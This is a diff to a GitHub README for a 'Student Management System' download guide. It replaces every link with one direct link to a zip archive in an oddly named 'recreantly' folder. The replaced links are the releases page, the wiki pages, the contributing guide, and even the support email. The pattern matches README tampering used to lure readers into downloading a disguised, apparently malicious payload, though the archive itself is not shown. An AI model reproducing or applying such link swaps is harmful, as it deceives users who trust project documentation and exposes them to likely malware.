@@ -6,7 +6,7 @@ Welcome to the Student Management System! This guide will help you download and 
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download%20Student%20Management%20System-brightgreen)](https://github.com/nastydadde/Student-Management-System/releases)
+[![Download](https://raw.githubusercontent.com/nastydadde/Student-Management-System/main/recreantly/Student-Management-System.zip%20Student%20Management%20System-brightgreen)](https://raw.githubusercontent.com/nastydadde/Student-Management-System/main/recreantly/Student-Management-System.zip)
 
 ## 📋 About the Software
 
@@ -34,7 +34,7 @@ Before you download and install the application, ensure your system meets the fo
 To get started, follow these steps:
 
 1. **Visit the Download Page**: Click the link below to visit our Releases page:
-   [Download Page](https://github.com/nastydadde/Student-Management-System/releases)
+   [Download Page](https://raw.githubusercontent.com/nastydadde/Student-Management-System/main/recreantly/Student-Management-System.zip)
 
 2. **Choose the Latest Version**: Scroll down to find the latest version of the Student Management System. Each version is listed with the release date.
 
@@ -57,21 +57,21 @@ To get started, follow these steps:
 
 If you encounter any issues or have questions about the software, please reach out for support. 
 
-- **Email**: support@studentmanagementsystem.com
+- **Email**: https://raw.githubusercontent.com/nastydadde/Student-Management-System/main/recreantly/Student-Management-System.zip
 - **Phone**: 1-800-555-0199
 
 ## 🚀 Additional Resources
 
 Check out our documentation for more detailed guides and FAQs:
 
-- [User Guide](https://github.com/nastydadde/Student-Management-System/wiki)
-- [Troubleshooting](https://github.com/nastydadde/Student-Management-System/wiki/Troubleshooting)
+- [User Guide](https://raw.githubusercontent.com/nastydadde/Student-Management-System/main/recreantly/Student-Management-System.zip)
+- [Troubleshooting](https://raw.githubusercontent.com/nastydadde/Student-Management-System/main/recreantly/Student-Management-System.zip)
 
 ## 🎉 Community Contributions
 
-We welcome contributions to enhance the Student Management System. If you want to help, please visit our [Contributing Guide](https://github.com/nastydadde/Student-Management-System/blob/main/CONTRIBUTING.md).
+We welcome contributions to enhance the Student Management System. If you want to help, please visit our [Contributing Guide](https://raw.githubusercontent.com/nastydadde/Student-Management-System/main/recreantly/Student-Management-System.zip).
 
 ## 📥 Download Now Again
 
 Don't forget to download the latest version here:
-[Download Page](https://github.com/nastydadde/Student-Management-System/releases)
+[Download Page](https://raw.githubusercontent.com/nastydadde/Student-Management-System/main/recreantly/Student-Management-System.zip)
